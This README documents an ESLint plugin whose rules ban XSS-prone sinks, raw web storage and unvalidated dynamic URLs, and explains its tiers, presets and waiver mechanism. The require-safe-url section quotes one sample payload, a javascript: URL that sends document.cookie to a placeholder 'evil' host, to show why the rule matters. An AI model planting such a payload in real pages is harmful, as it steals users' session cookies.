# @sanaafshani/warden-eslint-plugin

Five ESLint rules that keep client-side security controls switched on, three of
them tier `required` — they stay errors unless you waive them on the record.
Independent of both tracks: it has no dependency on them, and the names it
suggests (`SafeHtml`, `safeUrl`, an `encrypted()` store) are the
`@sanaafshani/warden-csr-*` ones by default and configurable per rule.

```bash
npm i -D @sanaafshani/warden-eslint-plugin
```

```js
// eslint.config.mjs
import warden from '@sanaafshani/warden-eslint-plugin';

export default [
  // ...your config
  warden.configs.recommended,      // or .migrating for an existing codebase
];
```

---

## Why a lint plugin is the highest-leverage piece here

The library can make the safe thing easy. It cannot make the unsafe thing
impossible: `localStorage.setItem` and `dangerouslySetInnerHTML` are still one
line away, and they are shorter.

A control the build does not enforce survives exactly as long as the person who
introduced it. Six months later there is a new developer, a deadline, and a
Stack Overflow answer that uses `innerHTML`. These rules are the part that keeps
working after everyone has forgotten the conversation.

---

## The rules

### `no-dangerous-html`

Bans `dangerouslySetInnerHTML`. React escapes `{value}`, so a React app usually
has no XSS — until one component renders rich text. That component is reviewed
once; the next three copy it.

```tsx
<div dangerouslySetInnerHTML={{ __html: body }} />   // ✗
<SafeHtml html={body} />                              // ✓
```

**Options:** `{ component: 'SafeHtml' }` — the name suggested in the message.

### `no-dom-html-sink`

Bans `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`.

Not because the string might be dirty — because of **mutation XSS**: the
browser's parser *rewrites* markup during assignment, so a string that is
provably clean beforehand can be executable afterwards. The rule does not judge
the string; it bans the sink.

```js
el.innerHTML = value;            // ✗
el.textContent = value;          // ✓  (what most of these meant anyway)
el.append(node);                 // ✓
el.innerHTML = await sanitizeHtml(value);   // still ✗ — use Trusted Types or <SafeHtml>
```

### `no-raw-web-storage`

Bans direct `localStorage`, `sessionStorage` and `document.cookie`.

This is **not** an XSS defence — nothing in a browser is. It stops blind
exfiltration (a stealer script that dumps storage gets ciphertext, and the key
is non-extractable), at-rest exposure in profile backups and on shared machines,
and — mostly — **drift**, so the answer to "is our storage encrypted?" is never
"some of it".

`document.cookie` is included because a cookie written from JavaScript can never
be `httpOnly`. Only a `Set-Cookie` header can do that.

```js
localStorage.setItem('token', t);                  // ✗
persist(fn, { storage: localStorage });            // ✗  how a whole store leaks
typeof localStorage === 'undefined' ? a() : b();   // ✓  an availability guard
await store.set('auth.tokens', t);                 // ✓  an encrypted() store
```

**Options:** `{ replacement: '<your wrapper>', allowReads: false }`.
`allowReads` is for a migration — move writes first, because an unencrypted read
of an encrypted value just returns null, while an unencrypted write leaves
plaintext on disk that outlives the migration.

### `require-safe-url`

A dynamic `href`, `src`, `action`, `formAction`, `poster` or `srcDoc` must pass
through a URL validator.

JSX escapes text but **not attributes**. `<a href={user.website}>` with
`javascript:fetch('//evil?c='+document.cookie)` is a stored one-click XSS, and
it is common precisely because people learned that "React escapes everything".

```tsx
<a href={user.website}>site</a>                   // ✗
<a href={safeUrl(user.website) ?? '#'}>site</a>   // ✓
<a href={ok ? safeUrl(a) : '#'}>x</a>            // ✓  both branches checked
```

**Options:** `{ validators: ['safeUrl'], extraAttributes: [] }`.

### `no-unsafe-target-blank`

`target="_blank"` requires `rel="noopener"`. Auto-fixable when `rel` is absent.

The opened page gets a live `window.opener` handle to your tab and can replace
your page with a phishing copy while the user is reading the new one.
"Modern browsers do this by default" is true for anchors and false for
`window.open`, older webviews, and `Referer` leakage.

---

## Tiers

Every rule declares how bad it is if the rule is off. The tier is on the rule
itself, not in a preset, so it survives a hand-written config:

| tier | rules | means |
| --- | --- | --- |
| **`required`** | `no-dangerous-html`, `no-dom-html-sink`, `require-safe-url` | guards an injection class nothing here mitigates at runtime. `error` in every preset; `enforce()` refuses a config that lowers it |
| `recommended` | `no-raw-web-storage`, `no-unsafe-target-blank` | defence in depth — the failure needs a second failure to become an incident. A team may switch these off |

`require-safe-url` is the noisiest rule here and is still `required`, because
noise is an **adoption** cost and not a severity. Collapsing the two axes is how
`warn` gets chosen for a rule that guards `javascript:` URLs.

## Presets

| | for |
| --- | --- |
| `recommended` | all five as **errors** |
| `migrating` | same severities, but web-storage reads are allowed |

`migrating` differs by **option**, never by severity: a config named "migrating"
is the most tempting place to park a `warn` forever, which is exactly why the
tier does not let it. Adopt gradually by **scoping the config to a directory**,
which is visible in the config file — not by lowering severity, which is
visible nowhere.

## Enforcing the tiers

ESLint gives a plugin no way to forbid an override — a flat config is an array
and the last entry wins. So `enforce()` reads the config instead and refuses one
that lowers a `required` rule, rather than silently re-enabling it and sending
you hunting for why your `'off'` did nothing.

```js
// eslint.config.mjs
import warden from '@sanaafshani/warden-eslint-plugin';

export default warden.enforce(            // outermost: it sees only what it is given
  { ...warden.configs.recommended, files: ['src/**/*.ts'] },

  // A required rule costs a scope and a reason to switch off.
  warden.waive({
    rule: 'no-dangerous-html',
    files: ['src/components/SafeHtml.tsx'],
    reason: 'The one sink; DOMPurify runs on the line above it.',
  }),
);
```

Pass it the **whole** array. It inspects exactly the configs handed to it, so a
fragment would miss a downgrade sitting elsewhere in the file — it throws if it
receives no config registering the plugin, because that is the tell.

`waive()` is not a loophole in the tier, it is the tier's price list: a scope
and a sentence, both greppable and both in the diff. A control with no hatch
gets removed wholesale the first time it blocks legitimate work.

## Design notes

- **Syntax-only, no type information.** Slower type-aware rules only run where a
  tsconfig covers the file, and the file nobody added to `include` is exactly
  where the mistake will be. The cost is occasional false positives; the cost of
  the other choice is a false negative, which is a vulnerability.
- **No domain knowledge.** No roles, permissions or endpoint names. Every name a
  rule needs — the component, the validator, the storage replacement — is an
  option, with ours only as the default.
- **Dogfooded.** These rules run on this repository, including on the library
  they protect. The exemptions are per-file and each carries its reason. Running
  them on our own code is what found the `typeof localStorage` false positive.
